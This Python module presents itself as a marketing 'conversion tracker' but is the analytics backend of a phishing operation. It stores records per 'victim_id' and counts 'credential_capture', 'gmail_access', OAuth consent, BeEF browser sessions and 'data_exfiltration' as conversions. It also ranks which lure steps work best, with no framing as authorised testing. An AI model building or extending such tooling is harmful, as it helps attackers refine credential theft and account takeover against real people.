"""
Conversion Tracker Engine
Advanced conversion tracking and attribution system
"""

import os
import json
import time
import uuid
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
from dataclasses import dataclass, asdict
from collections import defaultdict
import hashlib

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class AttributionEvent:
    """Attribution event for conversion tracking"""
    event_id: str
    campaign_id: str
    victim_id: str
    touchpoint: str  # email_open, email_click, landing_page_view, oauth_start
    timestamp: datetime
    session_id: str
    attribution_data: Dict[str, Any]

@dataclass
class ConversionPath:
    """Conversion path tracking"""
    path_id: str
    campaign_id: str
    victim_id: str
    touchpoints: List[AttributionEvent]
    conversion_event: Optional[Dict[str, Any]]
    conversion_value: float
    path_length: int
    time_to_conversion: float
    first_touchpoint: datetime
    last_touchpoint: datetime

@dataclass
class AttributionModel:
    """Attribution model configuration"""
    model_type: str  # first_touch, last_touch, linear, time_decay, position_based
    touchpoint_weights: Dict[str, float]
    time_decay_factor: float
    position_weights: Dict[int, float]

class ConversionTracker:
    """Advanced conversion tracking and attribution system"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.conversion_paths = {}
        self.attribution_models = {}
        
        # Initialize default attribution models
        self._initialize_attribution_models()
        
        # Conversion tracking configuration
        self.config = {
            "attribution_window": 30 * 24 * 3600,  # 30 days in seconds
            "session_timeout": 30 * 60,  # 30 minutes in seconds
            "touchpoint_types": [
                "email_sent",
                "email_opened", 
                "email_clicked",
                "landing_page_view",
                "oauth_start",
                "oauth_complete",
                "credential_capture",
                "gmail_access",
                "beef_session"
            ],
            "conversion_types": [
                "oauth_completion",
                "credential_capture", 
                "gmail_access",
                "beef_session",
                "data_exfiltration"
            ]
        }
    
    def _initialize_attribution_models(self):
        """Initialize default attribution models"""
        self.attribution_models = {
            "first_touch": AttributionModel(
                model_type="first_touch",
                touchpoint_weights={},
                time_decay_factor=0.0,
                position_weights={}
            ),
            "last_touch": AttributionModel(
                model_type="last_touch", 
                touchpoint_weights={},
                time_decay_factor=0.0,
                position_weights={}
            ),
            "linear": AttributionModel(
                model_type="linear",
                touchpoint_weights={},
                time_decay_factor=0.0,
                position_weights={}
            ),
            "time_decay": AttributionModel(
                model_type="time_decay",
                touchpoint_weights={},
                time_decay_factor=0.5,  # 50% decay per day
                position_weights={}
            ),
            "position_based": AttributionModel(
                model_type="position_based",
                touchpoint_weights={},
                time_decay_factor=0.0,
                position_weights={
                    1: 0.4,  # First touchpoint: 40%
                    2: 0.3,  # Second touchpoint: 30%
                    3: 0.2,  # Third touchpoint: 20%
                    4: 0.1   # Fourth+ touchpoint: 10%
                }
            )
        }
    
    def track_touchpoint(self, campaign_id: str, victim_id: str, touchpoint: str, 
                       session_id: str = None, attribution_data: Dict[str, Any] = None) -> str:
        """Track a touchpoint event"""
        try:
            event_id = f"touch_{int(time.time())}_{victim_id}"
            
            if not session_id:
                session_id = self._get_or_create_session(campaign_id, victim_id)
            
            event = AttributionEvent(
                event_id=event_id,
                campaign_id=campaign_id,
                victim_id=victim_id,
                touchpoint=touchpoint,
                timestamp=datetime.now(timezone.utc),
                session_id=session_id,
                attribution_data=attribution_data or {}
            )
            
            # Store touchpoint event
            self._store_touchpoint_event(event)
            
            # Update conversion path
            self._update_conversion_path(event)
            
            logger.info(f"Touchpoint tracked: {touchpoint} for victim {victim_id}")
            return event_id
            
        except Exception as e:
            logger.error(f"Error tracking touchpoint: {e}")
            return None
    
    def _get_or_create_session(self, campaign_id: str, victim_id: str) -> str:
        """Get existing session or create new one"""
        try:
            # Check for existing active session
            session_key = f"session:{campaign_id}:{victim_id}"
            
            if self.redis:
                existing_session = self.redis.get(session_key)
                if existing_session:
                    session_data = json.loads(existing_session)
                    # Check if session is still active
                    last_activity = datetime.fromisoformat(session_data["last_activity"])
                    if (datetime.now(timezone.utc) - last_activity).total_seconds() < self.config["session_timeout"]:
                        return session_data["session_id"]
            
            # Create new session
            session_id = f"session_{uuid.uuid4().hex[:12]}"
            session_data = {
                "session_id": session_id,
                "campaign_id": campaign_id,
                "victim_id": victim_id,
                "created_at": datetime.now(timezone.utc).isoformat(),
                "last_activity": datetime.now(timezone.utc).isoformat(),
                "touchpoint_count": 0
            }
            
            if self.redis:
                self.redis.setex(session_key, self.config["session_timeout"], json.dumps(session_data))
            
            return session_id
            
        except Exception as e:
            logger.error(f"Error getting/creating session: {e}")
            return f"session_{uuid.uuid4().hex[:12]}"
    
    def _store_touchpoint_event(self, event: AttributionEvent):
        """Store touchpoint event in database"""
        try:
            if not self.mongodb:
                return
            
            collection = self.mongodb.attribution_events
            event_doc = asdict(event)
            event_doc["timestamp"] = event.timestamp
            
            collection.insert_one(event_doc)
            
        except Exception as e:
            logger.error(f"Error storing touchpoint event: {e}")
    
    def _update_conversion_path(self, event: AttributionEvent):
        """Update conversion path with new touchpoint"""
        try:
            path_key = f"{event.campaign_id}:{event.victim_id}"
            
            if path_key not in self.conversion_paths:
                self.conversion_paths[path_key] = ConversionPath(
                    path_id=f"path_{uuid.uuid4().hex[:12]}",
                    campaign_id=event.campaign_id,
                    victim_id=event.victim_id,
                    touchpoints=[],
                    conversion_event=None,
                    conversion_value=0.0,
                    path_length=0,
                    time_to_conversion=0.0,
                    first_touchpoint=event.timestamp,
                    last_touchpoint=event.timestamp
                )
            
            path = self.conversion_paths[path_key]
            path.touchpoints.append(event)
            path.path_length = len(path.touchpoints)
            path.last_touchpoint = event.timestamp
            
            # Update session activity
            self._update_session_activity(event.session_id, event.timestamp)
            
        except Exception as e:
            logger.error(f"Error updating conversion path: {e}")
    
    def _update_session_activity(self, session_id: str, timestamp: datetime):
        """Update session activity timestamp"""
        try:
            if not self.redis:
                return
            
            # Find session by session_id
            # This would need to be implemented based on your session storage strategy
            pass
            
        except Exception as e:
            logger.error(f"Error updating session activity: {e}")
    
    def track_conversion(self, campaign_id: str, victim_id: str, conversion_type: str, 
                       conversion_value: float = 0.0, conversion_data: Dict[str, Any] = None) -> str:
        """Track a conversion event"""
        try:
            conversion_id = f"conv_{int(time.time())}_{victim_id}"
            path_key = f"{campaign_id}:{victim_id}"
            
            # Get or create conversion path
            if path_key not in self.conversion_paths:
                self.conversion_paths[path_key] = ConversionPath(
                    path_id=f"path_{uuid.uuid4().hex[:12]}",
                    campaign_id=campaign_id,
                    victim_id=victim_id,
                    touchpoints=[],
                    conversion_event=None,
                    conversion_value=0.0,
                    path_length=0,
                    time_to_conversion=0.0,
                    first_touchpoint=datetime.now(timezone.utc),
                    last_touchpoint=datetime.now(timezone.utc)
                )
            
            path = self.conversion_paths[path_key]
            
            # Create conversion event
            conversion_event = {
                "conversion_id": conversion_id,
                "conversion_type": conversion_type,
                "conversion_value": conversion_value,
                "timestamp": datetime.now(timezone.utc),
                "conversion_data": conversion_data or {}
            }
            
            # Update conversion path
            path.conversion_event = conversion_event
            path.conversion_value = conversion_value
            
            if path.touchpoints:
                path.time_to_conversion = (path.conversion_event["timestamp"] - path.first_touchpoint).total_seconds()
            
            # Store conversion event
            self._store_conversion_event(conversion_event, path)
            
            logger.info(f"Conversion tracked: {conversion_type} for victim {victim_id}")
            return conversion_id
            
        except Exception as e:
            logger.error(f"Error tracking conversion: {e}")
            return None
    
    def _store_conversion_event(self, conversion_event: Dict[str, Any], path: ConversionPath):
        """Store conversion event in database"""
        try:
            if not self.mongodb:
                return
            
            collection = self.mongodb.conversion_events
            event_doc = {
                **conversion_event,
                "path_id": path.path_id,
                "campaign_id": path.campaign_id,
                "victim_id": path.victim_id,
                "path_length": path.path_length,
                "time_to_conversion": path.time_to_conversion,
                "touchpoints": [asdict(tp) for tp in path.touchpoints]
            }
            
            collection.insert_one(event_doc)
            
        except Exception as e:
            logger.error(f"Error storing conversion event: {e}")
    
    def get_conversion_path(self, campaign_id: str, victim_id: str) -> Optional[ConversionPath]:
        """Get conversion path for a victim"""
        try:
            path_key = f"{campaign_id}:{victim_id}"
            return self.conversion_paths.get(path_key)
            
        except Exception as e:
            logger.error(f"Error getting conversion path: {e}")
            return None
    
    def get_campaign_attribution(self, campaign_id: str, attribution_model: str = "last_touch", 
                               start_date: datetime = None, end_date: datetime = None) -> Dict[str, Any]:
        """Get campaign attribution analysis"""
        try:
            if not start_date:
                start_date = datetime.now(timezone.utc) - timedelta(days=30)
            if not end_date:
                end_date = datetime.now(timezone.utc)
            
            # Get attribution model
            model = self.attribution_models.get(attribution_model)
            if not model:
                raise ValueError(f"Unknown attribution model: {attribution_model}")
            
            # Get conversion paths for campaign
            conversion_paths = self._get_campaign_conversion_paths(campaign_id, start_date, end_date)
            
            # Calculate attribution
            attribution = self._calculate_attribution(conversion_paths, model)
            
            return attribution
            
        except Exception as e:
            logger.error(f"Error getting campaign attribution: {e}")
            return {}
    
    def _get_campaign_conversion_paths(self, campaign_id: str, start_date: datetime, end_date: datetime) -> List[ConversionPath]:
        """Get conversion paths for campaign from database"""
        try:
            if not self.mongodb:
                return []
            
            collection = self.mongodb.conversion_events
            cursor = collection.find({
                "campaign_id": campaign_id,
                "timestamp": {"$gte": start_date, "$lte": end_date}
            })
            
            paths = []
            for doc in cursor:
                path = ConversionPath(
                    path_id=doc["path_id"],
                    campaign_id=doc["campaign_id"],
                    victim_id=doc["victim_id"],
                    touchpoints=[AttributionEvent(**tp) for tp in doc.get("touchpoints", [])],
                    conversion_event=doc,
                    conversion_value=doc.get("conversion_value", 0.0),
                    path_length=doc.get("path_length", 0),
                    time_to_conversion=doc.get("time_to_conversion", 0.0),
                    first_touchpoint=datetime.fromisoformat(doc.get("first_touchpoint", datetime.now(timezone.utc).isoformat())),
                    last_touchpoint=datetime.fromisoformat(doc.get("last_touchpoint", datetime.now(timezone.utc).isoformat()))
                )
                paths.append(path)
            
            return paths
            
        except Exception as e:
            logger.error(f"Error getting campaign conversion paths: {e}")
            return []
    
    def _calculate_attribution(self, conversion_paths: List[ConversionPath], model: AttributionModel) -> Dict[str, Any]:
        """Calculate attribution based on model"""
        try:
            attribution = {
                "model_type": model.model_type,
                "total_conversions": len(conversion_paths),
                "total_value": sum(path.conversion_value for path in conversion_paths),
                "touchpoint_attribution": defaultdict(float),
                "path_length_distribution": defaultdict(int),
                "time_to_conversion_distribution": defaultdict(int),
                "touchpoint_frequency": defaultdict(int)
            }
            
            for path in conversion_paths:
                # Count path length distribution
                attribution["path_length_distribution"][path.path_length] += 1
                
                # Count time to conversion distribution
                time_bucket = int(path.time_to_conversion / 3600)  # Hours
                attribution["time_to_conversion_distribution"][time_bucket] += 1
                
                # Calculate attribution based on model
                if model.model_type == "first_touch":
                    if path.touchpoints:
                        first_touchpoint = path.touchpoints[0].touchpoint
                        attribution["touchpoint_attribution"][first_touchpoint] += path.conversion_value
                
                elif model.model_type == "last_touch":
                    if path.touchpoints:
                        last_touchpoint = path.touchpoints[-1].touchpoint
                        attribution["touchpoint_attribution"][last_touchpoint] += path.conversion_value
                
                elif model.model_type == "linear":
                    if path.touchpoints:
                        value_per_touchpoint = path.conversion_value / len(path.touchpoints)
                        for touchpoint in path.touchpoints:
                            attribution["touchpoint_attribution"][touchpoint.touchpoint] += value_per_touchpoint
                
                elif model.model_type == "time_decay":
                    if path.touchpoints:
                        total_weight = 0
                        weights = {}
                        
                        for touchpoint in path.touchpoints:
                            time_diff = (path.conversion_event["timestamp"] - touchpoint.timestamp).total_seconds()
                            weight = model.time_decay_factor ** (time_diff / 86400)  # Decay per day
                            weights[touchpoint.touchpoint] = weight
                            total_weight += weight
                        
                        for touchpoint, weight in weights.items():
                            attribution["touchpoint_attribution"][touchpoint] += path.conversion_value * (weight / total_weight)
                
                elif model.model_type == "position_based":
                    if path.touchpoints:
                        for i, touchpoint in enumerate(path.touchpoints):
                            position = i + 1
                            weight = model.position_weights.get(position, model.position_weights.get(4, 0.1))
                            attribution["touchpoint_attribution"][touchpoint.touchpoint] += path.conversion_value * weight
                
                # Count touchpoint frequency
                for touchpoint in path.touchpoints:
                    attribution["touchpoint_frequency"][touchpoint.touchpoint] += 1
            
            # Convert defaultdicts to regular dicts
            attribution["touchpoint_attribution"] = dict(attribution["touchpoint_attribution"])
            attribution["path_length_distribution"] = dict(attribution["path_length_distribution"])
            attribution["time_to_conversion_distribution"] = dict(attribution["time_to_conversion_distribution"])
            attribution["touchpoint_frequency"] = dict(attribution["touchpoint_frequency"])
            
            return attribution
            
        except Exception as e:
            logger.error(f"Error calculating attribution: {e}")
            return {}
    
    def get_touchpoint_analysis(self, campaign_id: str, start_date: datetime = None, 
                              end_date: datetime = None) -> Dict[str, Any]:
        """Get detailed touchpoint analysis"""
        try:
            if not start_date:
                start_date = datetime.now(timezone.utc) - timedelta(days=30)
            if not end_date:
                end_date = datetime.now(timezone.utc)
            
            analysis = {
                "touchpoint_performance": {},
                "conversion_funnel": {},
                "drop_off_analysis": {},
                "optimal_path_length": 0,
                "average_time_to_conversion": 0.0
            }
            
            # Get conversion paths
            conversion_paths = self._get_campaign_conversion_paths(campaign_id, start_date, end_date)
            
            if not conversion_paths:
                return analysis
            
            # Analyze touchpoint performance
            touchpoint_stats = defaultdict(lambda: {"count": 0, "conversions": 0, "value": 0.0})
            
            for path in conversion_paths:
                for touchpoint in path.touchpoints:
                    stats = touchpoint_stats[touchpoint.touchpoint]
                    stats["count"] += 1
                    if path.conversion_event:
                        stats["conversions"] += 1
                        stats["value"] += path.conversion_value
            
            # Calculate performance metrics
            for touchpoint, stats in touchpoint_stats.items():
                analysis["touchpoint_performance"][touchpoint] = {
                    "total_occurrences": stats["count"],
                    "conversions": stats["conversions"],
                    "conversion_rate": (stats["conversions"] / stats["count"] * 100) if stats["count"] > 0 else 0,
                    "total_value": stats["value"],
                    "average_value": (stats["value"] / stats["conversions"]) if stats["conversions"] > 0 else 0
                }
            
            # Calculate conversion funnel
            funnel_stages = ["email_sent", "email_opened", "email_clicked", "oauth_start", "oauth_complete"]
            funnel_counts = {}
            
            for stage in funnel_stages:
                count = sum(1 for path in conversion_paths 
                           if any(tp.touchpoint == stage for tp in path.touchpoints))
                funnel_counts[stage] = count
            
            analysis["conversion_funnel"] = funnel_counts
            
            # Calculate drop-off analysis
            prev_count = None
            for stage in funnel_stages:
                count = funnel_counts[stage]
                if prev_count is not None:
                    drop_off = prev_count - count
                    drop_off_rate = (drop_off / prev_count * 100) if prev_count > 0 else 0
                    analysis["drop_off_analysis"][f"{prev_stage}_to_{stage}"] = {
                        "drop_off_count": drop_off,
                        "drop_off_rate": drop_off_rate
                    }
                prev_count = count
                prev_stage = stage
            
            # Calculate optimal path length
            path_lengths = [path.path_length for path in conversion_paths]
            if path_lengths:
                analysis["optimal_path_length"] = max(set(path_lengths), key=path_lengths.count)
            
            # Calculate average time to conversion
            conversion_times = [path.time_to_conversion for path in conversion_paths if path.time_to_conversion > 0]
            if conversion_times:
                analysis["average_time_to_conversion"] = sum(conversion_times) / len(conversion_times)
            
            return analysis
            
        except Exception as e:
            logger.error(f"Error getting touchpoint analysis: {e}")
            return {}
    
    def get_campaign_comparison(self, campaign_ids: List[str], attribution_model: str = "last_touch",
                              start_date: datetime = None, end_date: datetime = None) -> Dict[str, Any]:
        """Compare attribution across multiple campaigns"""
        try:
            if not start_date:
                start_date = datetime.now(timezone.utc) - timedelta(days=30)
            if not end_date:
                end_date = datetime.now(timezone.utc)
            
            comparison = {
                "campaigns": {},
                "summary": {
                    "best_performing_touchpoint": None,
                    "worst_performing_touchpoint": None,
                    "average_path_length": 0.0,
                    "average_time_to_conversion": 0.0
                }
            }
            
            all_touchpoint_performance = defaultdict(list)
            all_path_lengths = []
            all_conversion_times = []
            
            for campaign_id in campaign_ids:
                attribution = self.get_campaign_attribution(campaign_id, attribution_model, start_date, end_date)
                touchpoint_analysis = self.get_touchpoint_analysis(campaign_id, start_date, end_date)
                
                comparison["campaigns"][campaign_id] = {
                    "attribution": attribution,
                    "touchpoint_analysis": touchpoint_analysis
                }
                
                # Collect data for summary
                for touchpoint, performance in touchpoint_analysis.get("touchpoint_performance", {}).items():
                    all_touchpoint_performance[touchpoint].append(performance["conversion_rate"])
                
                all_path_lengths.append(touchpoint_analysis.get("optimal_path_length", 0))
                all_conversion_times.append(touchpoint_analysis.get("average_time_to_conversion", 0))
            
            # Calculate summary metrics
            if all_touchpoint_performance:
                touchpoint_avg_performance = {}
                for touchpoint, rates in all_touchpoint_performance.items():
                    touchpoint_avg_performance[touchpoint] = sum(rates) / len(rates)
                
                if touchpoint_avg_performance:
                    best_touchpoint = max(touchpoint_avg_performance.items(), key=lambda x: x[1])
                    worst_touchpoint = min(touchpoint_avg_performance.items(), key=lambda x: x[1])
                    
                    comparison["summary"]["best_performing_touchpoint"] = best_touchpoint[0]
                    comparison["summary"]["worst_performing_touchpoint"] = worst_touchpoint[0]
            
            if all_path_lengths:
                comparison["summary"]["average_path_length"] = sum(all_path_lengths) / len(all_path_lengths)
            
            if all_conversion_times:
                comparison["summary"]["average_time_to_conversion"] = sum(all_conversion_times) / len(all_conversion_times)
            
            return comparison
            
        except Exception as e:
            logger.error(f"Error comparing campaigns: {e}")
            return {}

# Global conversion tracker instance
conversion_tracker = None

def initialize_conversion_tracker(mongodb_connection=None, redis_client=None) -> ConversionTracker:
    """Initialize conversion tracker"""
    global conversion_tracker
    conversion_tracker = ConversionTracker(mongodb_connection, redis_client)
    return conversion_tracker

def get_conversion_tracker() -> ConversionTracker:
    """Get conversion tracker instance"""
    global conversion_tracker
    if conversion_tracker is None:
        conversion_tracker = ConversionTracker()
    return conversion_tracker
